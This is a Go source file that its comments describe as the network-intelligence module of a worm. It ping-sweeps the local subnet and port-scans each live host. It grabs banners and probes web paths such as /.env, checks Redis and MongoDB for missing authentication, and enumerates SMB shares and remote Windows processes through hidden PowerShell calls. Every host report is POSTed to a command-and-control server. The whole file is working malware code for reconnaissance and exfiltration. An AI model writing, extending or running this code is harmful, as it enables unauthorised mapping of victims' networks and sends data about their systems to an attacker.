package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
	"time"
)

// NetIntelReport is a full intelligence snapshot of one discovered host.
type NetIntelReport struct {
	AgentID   string        `json:"agent_id"`
	ScanTime  string        `json:"scan_time"`
	HostIP    string        `json:"host_ip"`
	Hostname  string        `json:"hostname,omitempty"`
	OpenPorts []PortProbe   `json:"open_ports"`
	SMBShares []string      `json:"smb_shares,omitempty"`
	WMIProcs  []string      `json:"wmi_procs,omitempty"`
	Redis     string        `json:"redis_info,omitempty"`
	MongoOpen bool          `json:"mongo_open,omitempty"`
	Notes     []string      `json:"notes,omitempty"`
}

// PortProbe holds what we learned about a single open port.
type PortProbe struct {
	Port    int          `json:"port"`
	Service string       `json:"service"`
	Banner  string       `json:"banner,omitempty"`
	HTTP    *HTTPFindings `json:"http,omitempty"`
}

// HTTPFindings is what we learn from scraping a web endpoint.
type HTTPFindings struct {
	StatusCode int               `json:"status"`
	Server     string            `json:"server,omitempty"`
	Title      string            `json:"title,omitempty"`
	Headers    map[string]string `json:"headers,omitempty"`
	Paths      []PathHit         `json:"interesting_paths,omitempty"`
}

// PathHit is one discovered path on an HTTP server.
type PathHit struct {
	Path   string `json:"path"`
	Status int    `json:"status"`
	Snip   string `json:"snippet,omitempty"`
}

// serviceNames maps well-known ports to human-readable service names.
var serviceNames = map[int]string{
	21:    "FTP",
	22:    "SSH",
	23:    "Telnet",
	25:    "SMTP",
	53:    "DNS",
	80:    "HTTP",
	110:   "POP3",
	135:   "RPC/DCOM",
	139:   "NetBIOS",
	143:   "IMAP",
	389:   "LDAP",
	443:   "HTTPS",
	445:   "SMB",
	993:   "IMAPS",
	995:   "POP3S",
	1433:  "MSSQL",
	1521:  "Oracle",
	2379:  "etcd",
	3000:  "HTTP-dev",
	3306:  "MySQL",
	3389:  "RDP",
	4243:  "Docker",
	5000:  "HTTP-dev",
	5432:  "PostgreSQL",
	5900:  "VNC",
	5985:  "WinRM-HTTP",
	5986:  "WinRM-HTTPS",
	6379:  "Redis",
	6443:  "k8s-API",
	7474:  "Neo4j",
	8080:  "HTTP-alt",
	8443:  "HTTPS-alt",
	8888:  "Jupyter",
	9000:  "HTTP-dev",
	9090:  "Prometheus",
	9200:  "Elasticsearch",
	27017: "MongoDB",
	27018: "MongoDB-replica",
}

// probeTargets is the expanded port list the worm scans (vs. the basic spread.go list).
var probeTargets = []int{
	21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
	389, 443, 445, 993, 995, 1433, 1521, 2379,
	3000, 3306, 3389, 4243, 5000, 5432, 5900,
	5985, 5986, 6379, 6443, 7474, 8080, 8443,
	8888, 9000, 9090, 9200, 27017,
}

// httpPaths to probe on discovered web services.
var httpPaths = []string{
	"/", "/api", "/api/v1", "/v1", "/v2",
	"/admin", "/dashboard", "/metrics", "/health", "/healthz",
	"/swagger", "/swagger-ui/", "/openapi.json", "/docs",
	"/robots.txt", "/sitemap.xml", "/.env", "/config",
	"/wp-login.php", "/phpmyadmin/", "/actuator",
}

var reTitleTag = regexp.MustCompile(`(?i)<title[^>]*>([^<]+)</title>`)

// runNetIntel is the main worm entry point. It discovers the local subnet,
// deeply probes each host, and streams intelligence reports to C2.
func runNetIntel(c2url string) {
	localIP := strings.Split(getLocalIPs(), ",")[0]
	parts := strings.Split(strings.TrimSpace(localIP), ".")
	if len(parts) != 4 {
		return
	}
	prefix := strings.Join(parts[:3], ".")

	type result struct {
		ip   string
		live bool
	}
	liveCh := make(chan string, 256)

	// Concurrent ping sweep
	for i := 1; i <= 254; i++ {
		target := fmt.Sprintf("%s.%d", prefix, i)
		go func(ip string) {
			if isReachable(ip) {
				liveCh <- ip
			} else {
				liveCh <- ""
			}
		}(target)
	}

	var liveHosts []string
	for i := 0; i < 254; i++ {
		if ip := <-liveCh; ip != "" {
			liveHosts = append(liveHosts, ip)
		}
	}

	// Deep probe each live host
	for _, ip := range liveHosts {
		report := probeHost(ip)
		sendNetIntel(c2url, report)
	}
}

// probeHost performs full intelligence gathering on a single IP.
func probeHost(ip string) NetIntelReport {
	report := NetIntelReport{
		AgentID:  agentID,
		ScanTime: time.Now().UTC().Format(time.RFC3339),
		HostIP:   ip,
	}

	// Reverse DNS
	if names, err := net.LookupAddr(ip); err == nil && len(names) > 0 {
		report.Hostname = strings.TrimSuffix(names[0], ".")
	}

	// Port scan (concurrent, 500ms timeout each)
	type portResult struct {
		port int
		open bool
	}
	portCh := make(chan portResult, len(probeTargets))
	for _, p := range probeTargets {
		go func(port int) {
			conn, err := net.DialTimeout("tcp",
				fmt.Sprintf("%s:%d", ip, port), 500*time.Millisecond)
			if err == nil {
				conn.Close()
				portCh <- portResult{port, true}
			} else {
				portCh <- portResult{port, false}
			}
		}(p)
	}

	var openPorts []int
	for range probeTargets {
		r := <-portCh
		if r.open {
			openPorts = append(openPorts, r.port)
		}
	}

	// Per-port deep probe
	for _, port := range openPorts {
		probe := probePort(ip, port)
		report.OpenPorts = append(report.OpenPorts, probe)
	}

	// SMB share enumeration (port 445)
	if containsPort(openPorts, 445) {
		report.SMBShares = enumSMBShares(ip)
	}

	// Redis intelligence (port 6379)
	if containsPort(openPorts, 6379) {
		report.Redis = redisInfo(ip)
		if report.Redis != "" {
			report.Notes = append(report.Notes, "Redis responding WITHOUT authentication")
		}
	}

	// MongoDB open check (port 27017)
	if containsPort(openPorts, 27017) {
		report.MongoOpen = mongoCheck(ip)
		if report.MongoOpen {
			report.Notes = append(report.Notes, "MongoDB port open (check auth)")
		}
	}

	// WMI remote process list (port 135 on Windows hosts)
	if containsPort(openPorts, 135) && runtime.GOOS == "windows" {
		report.WMIProcs = wmiRemoteProcs(ip)
	}

	return report
}

// probePort does banner grab and service-specific probing on one open port.
func probePort(ip string, port int) PortProbe {
	svc, ok := serviceNames[port]
	if !ok {
		svc = "unknown"
	}
	pp := PortProbe{Port: port, Service: svc}

	// Banner grab with service-specific probes
	var probe []byte
	switch port {
	case 21, 22, 25, 110, 143, 993, 995:
		probe = nil // these servers send banner first
	case 80, 8080, 3000, 5000, 9000, 9090:
		pp.HTTP = httpProbe(ip, port, false)
		pp.Banner = fmt.Sprintf("HTTP %d", pp.HTTP.StatusCode)
		return pp
	case 443, 8443, 5986:
		pp.HTTP = httpProbe(ip, port, true)
		pp.Banner = fmt.Sprintf("HTTPS %d", pp.HTTP.StatusCode)
		return pp
	case 6379:
		probe = []byte("PING\r\n")
	case 9200:
		// Elasticsearch — just grab the banner
		probe = []byte("GET / HTTP/1.0\r\n\r\n")
	case 27017:
		// MongoDB — send an isMaster command (minimal wire protocol)
		probe = mongoIsMasterMsg()
	case 5985:
		pp.HTTP = httpProbe(ip, port, false)
		return pp
	default:
		probe = nil
	}

	pp.Banner = bannerGrab(ip, port, probe, 3*time.Second)
	return pp
}

// bannerGrab connects, optionally sends a probe, and reads the first response bytes.
func bannerGrab(ip string, port int, probe []byte, timeout time.Duration) string {
	conn, err := net.DialTimeout("tcp",
		fmt.Sprintf("%s:%d", ip, port), 2*time.Second)
	if err != nil {
		return ""
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	if len(probe) > 0 {
		conn.Write(probe)
	}

	buf := make([]byte, 4096)
	n, _ := conn.Read(buf)
	if n == 0 {
		return ""
	}
	// Clean non-printable bytes for JSON safety
	clean := strings.Map(func(r rune) rune {
		if r < 32 && r != '\n' && r != '\r' && r != '\t' {
			return '.'
		}
		return r
	}, string(buf[:n]))
	return strings.TrimSpace(clean)
}

// httpProbe sends an HTTP GET to / and a selection of interesting paths.
func httpProbe(ip string, port int, useHTTPS bool) *HTTPFindings {
	scheme := "http"
	if useHTTPS {
		scheme = "https"
	}
	base := fmt.Sprintf("%s://%s:%d", scheme, ip, port)

	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	findings := &HTTPFindings{
		Headers: make(map[string]string),
	}

	// Root request
	resp, err := client.Get(base + "/")
	if err == nil {
		defer resp.Body.Close()
		findings.StatusCode = resp.StatusCode
		findings.Server = resp.Header.Get("Server")

		// Capture interesting headers
		for _, h := range []string{"X-Powered-By", "X-Frame-Options", "Content-Type",
			"WWW-Authenticate", "X-Generator", "X-Application-Version"} {
			if v := resp.Header.Get(h); v != "" {
				findings.Headers[h] = v
			}
		}

		buf := make([]byte, 8192)
		n, _ := resp.Body.Read(buf)
		body := string(buf[:n])
		if m := reTitleTag.FindStringSubmatch(body); len(m) > 1 {
			findings.Title = strings.TrimSpace(m[1])
		}
	}

	// Probe interesting paths
	for _, path := range httpPaths {
		if path == "/" {
			continue // already done
		}
		r, err := client.Get(base + path)
		if err != nil {
			continue
		}
		if r.StatusCode != 404 {
			buf := make([]byte, 512)
			n, _ := r.Body.Read(buf)
			r.Body.Close()
			snip := strings.TrimSpace(string(buf[:n]))
			if len(snip) > 200 {
				snip = snip[:200] + "..."
			}
			findings.Paths = append(findings.Paths, PathHit{
				Path:   path,
				Status: r.StatusCode,
				Snip:   snip,
			})
		} else {
			r.Body.Close()
		}
	}

	return findings
}

// redisInfo connects to Redis on port 6379 and runs INFO to check if auth is required.
func redisInfo(ip string) string {
	conn, err := net.DialTimeout("tcp",
		fmt.Sprintf("%s:6379", ip), 2*time.Second)
	if err != nil {
		return ""
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(4 * time.Second))
	conn.Write([]byte("INFO server\r\n"))

	buf := make([]byte, 8192)
	n, _ := conn.Read(buf)
	if n == 0 {
		return ""
	}
	info := string(buf[:n])
	// If we get an error reply, Redis requires auth
	if strings.HasPrefix(info, "-NOAUTH") || strings.HasPrefix(info, "-ERR") {
		return "(auth required)"
	}
	// Return first 1024 chars of the INFO response
	if len(info) > 1024 {
		info = info[:1024] + "..."
	}
	return info
}

// mongoCheck sends a minimal isMaster wire message to see if MongoDB responds.
func mongoCheck(ip string) bool {
	conn, err := net.DialTimeout("tcp",
		fmt.Sprintf("%s:27017", ip), 2*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(3 * time.Second))
	msg := mongoIsMasterMsg()
	conn.Write(msg)
	buf := make([]byte, 256)
	n, _ := conn.Read(buf)
	return n > 0
}

// mongoIsMasterMsg returns a minimal MongoDB OP_MSG isMaster wire message.
func mongoIsMasterMsg() []byte {
	// Minimal OP_MSG: { isMaster: 1 }
	// Wire format: MsgHeader(16) + flagBits(4) + section(type=0) + doc
	doc := []byte{
		0x1a, 0x00, 0x00, 0x00, // doc length = 26
		0x10,                   // BSON type int32
		0x69, 0x73, 0x4d, 0x61, 0x73, 0x74, 0x65, 0x72, 0x00, // "isMaster\0"
		0x01, 0x00, 0x00, 0x00, // value = 1
		0x10,                                           // type int32
		0x24, 0x64, 0x62, 0x00,                         // "$db\0"
		0x61, 0x64, 0x6d, 0x69, 0x6e, 0x00,             // "admin\0"
		0x01, 0x00, 0x00, 0x00, // value = 1
		0x00, // end of doc
	}
	section := append([]byte{0x00}, doc...)
	flagBits := []byte{0x00, 0x00, 0x00, 0x00}
	body := append(flagBits, section...)

	totalLen := 16 + len(body)
	hdr := []byte{
		byte(totalLen), byte(totalLen >> 8), byte(totalLen >> 16), byte(totalLen >> 24),
		0x01, 0x00, 0x00, 0x00, // requestID
		0x00, 0x00, 0x00, 0x00, // responseTo
		0xDD, 0x07, 0x00, 0x00, // opCode = OP_MSG (2013)
	}
	return append(hdr, body...)
}

// enumSMBShares uses net view and PowerShell to list SMB shares on a Windows host.
func enumSMBShares(ip string) []string {
	var shares []string

	// net view \\IP /all
	netViewCmd := exec.Command("net", "view", fmt.Sprintf("\\\\%s", ip), "/all")
	hideWindow(netViewCmd)
	out, err := netViewCmd.Output()
	if err == nil {
		for _, line := range strings.Split(string(out), "\n") {
			line = strings.TrimSpace(line)
			if line == "" || strings.HasPrefix(line, "-") ||
				strings.HasPrefix(line, "Share") ||
				strings.HasPrefix(line, "The command") {
				continue
			}
			if idx := strings.Index(line, " "); idx > 0 {
				share := line[:idx]
				shares = append(shares, fmt.Sprintf("\\\\%s\\%s", ip, share))
			}
		}
	}

	// Try Get-SmbShare via PS if net view found nothing
	if len(shares) == 0 && runtime.GOOS == "windows" {
		smbCmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
			"-Command",
			fmt.Sprintf(`Get-SmbShare -CimSession %s 2>$null | Select-Object -ExpandProperty Name`, ip))
		hideWindow(smbCmd)
		psOut, err := smbCmd.Output()
		if err == nil {
			for _, name := range strings.Split(string(psOut), "\n") {
				name = strings.TrimSpace(name)
				if name != "" {
					shares = append(shares, fmt.Sprintf("\\\\%s\\%s", ip, name))
				}
			}
		}
	}

	return shares
}

// wmiRemoteProcs queries Win32_Process on a remote Windows host via WMI.
func wmiRemoteProcs(ip string) []string {
	if runtime.GOOS != "windows" {
		return nil
	}
	wmiCmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-Command",
		fmt.Sprintf(
			`Get-WmiObject Win32_Process -ComputerName %s -ErrorAction SilentlyContinue `+
				`| Select-Object -First 40 Name,ProcessId `+
				`| ForEach-Object { "$($_.ProcessId) $($_.Name)" }`, ip))
	hideWindow(wmiCmd)
	out, err := wmiCmd.Output()
	if err != nil {
		return nil
	}
	var procs []string
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if line != "" {
			procs = append(procs, line)
		}
	}
	return procs
}

// sendNetIntel POSTs a NetIntelReport to C2 /netintel.
func sendNetIntel(c2url string, report NetIntelReport) {
	body, _ := json.Marshal(report)
	client := &http.Client{Timeout: 15 * time.Second}
	client.Post(c2url+"/netintel", "application/json", bytes.NewReader(body))
}

